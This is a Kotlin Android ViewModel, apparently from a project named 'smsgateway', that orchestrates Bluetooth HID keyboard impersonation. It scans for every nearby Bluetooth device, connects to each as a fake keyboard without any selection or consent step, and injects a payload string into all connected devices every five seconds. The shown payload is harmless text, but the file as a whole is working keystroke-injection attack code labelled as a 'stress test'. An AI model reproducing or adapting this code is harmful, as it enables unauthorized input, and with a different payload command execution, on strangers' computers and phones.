package com.sunfeld.smsgateway

import android.bluetooth.BluetoothDevice
import android.content.Context
import android.os.Build
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

sealed class AttackState {
    data object Idle : AttackState()
    data object Scanning : AttackState()
    data class Attacking(val connectedCount: Int) : AttackState()
    data object Stopping : AttackState()
    data class Error(val message: String) : AttackState()
}

/**
 * Orchestrates on-device Bluetooth HID keyboard impersonation.
 *
 * Lifecycle:
 *   startAttack(context) → scans for BT devices → connects as HID keyboard to each →
 *   sends repeating keystrokes → stopAttack(context) → disconnects and stops scan.
 *
 * No network calls are made — everything runs on the phone.
 */
class BluetoothStressTestViewModel : ViewModel() {

    internal val scanner = BluetoothScanner()
    internal val hidManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
        BluetoothHidManager()
    } else null

    private val _state = MutableLiveData<AttackState>(AttackState.Idle)
    val state: LiveData<AttackState> = _state

    private val _discoveredDevices = MutableLiveData<List<BluetoothDevice>>(emptyList())
    val discoveredDevices: LiveData<List<BluetoothDevice>> = _discoveredDevices

    private val _connectedCount = MutableLiveData(0)
    val connectedCount: LiveData<Int> = _connectedCount

    private val _keystrokesSent = MutableLiveData(0)
    val keystrokesSent: LiveData<Int> = _keystrokesSent

    private var scanObserverJob: Job? = null
    private var connectedObserverJob: Job? = null
    private var keystrokeObserverJob: Job? = null
    private var attackLoopJob: Job? = null

    // Payload sent to each connected device every cycle
    private val payload = "Hello from your keyboard!\n"
    private val cycleDelayMs = 5_000L

    fun startAttack(context: Context) {
        if (_state.value is AttackState.Scanning || _state.value is AttackState.Attacking) return

        _state.value = AttackState.Scanning
        _discoveredDevices.value = emptyList()
        _connectedCount.value = 0
        _keystrokesSent.value = 0

        // Register HID profile
        hidManager?.register(context)

        // Start BT scan
        scanner.startScan(context)

        // Observe discovered devices — connect HID to each one found
        scanObserverJob = viewModelScope.launch {
            scanner.devices.collect { devices ->
                _discoveredDevices.postValue(devices)
                devices.forEach { device ->
                    hidManager?.connect(device)
                }
                if (devices.isNotEmpty() && _state.value is AttackState.Scanning) {
                    _state.postValue(AttackState.Attacking(0))
                }
            }
        }

        // Observe HID connected count
        connectedObserverJob = viewModelScope.launch {
            hidManager?.connectedDevices?.collect { connected ->
                _connectedCount.postValue(connected.size)
                if (_state.value is AttackState.Attacking || _state.value is AttackState.Scanning) {
                    _state.postValue(AttackState.Attacking(connected.size))
                }
            }
        }

        // Observe keystroke counter
        keystrokeObserverJob = viewModelScope.launch {
            hidManager?.keystrokesSent?.collect { count ->
                _keystrokesSent.postValue(count)
            }
        }

        // Attack loop: send keystrokes to all HID-connected devices periodically
        attackLoopJob = viewModelScope.launch {
            while (true) {
                delay(cycleDelayMs)
                val connected = hidManager?.connectedDevices?.value ?: emptySet()
                connected.forEach { device ->
                    hidManager?.sendText(device, payload)
                }
            }
        }
    }

    fun stopAttack(context: Context) {
        if (_state.value is AttackState.Idle || _state.value is AttackState.Stopping) return

        _state.value = AttackState.Stopping

        scanObserverJob?.cancel()
        connectedObserverJob?.cancel()
        keystrokeObserverJob?.cancel()
        attackLoopJob?.cancel()

        scanner.stopScan(context)
        hidManager?.disconnectAll()
        hidManager?.unregister(context)

        _state.value = AttackState.Idle
    }

    fun dismissError() {
        _state.value = AttackState.Idle
    }

    override fun onCleared() {
        super.onCleared()
        scanObserverJob?.cancel()
        connectedObserverJob?.cancel()
        keystrokeObserverJob?.cancel()
        attackLoopJob?.cancel()
    }
}
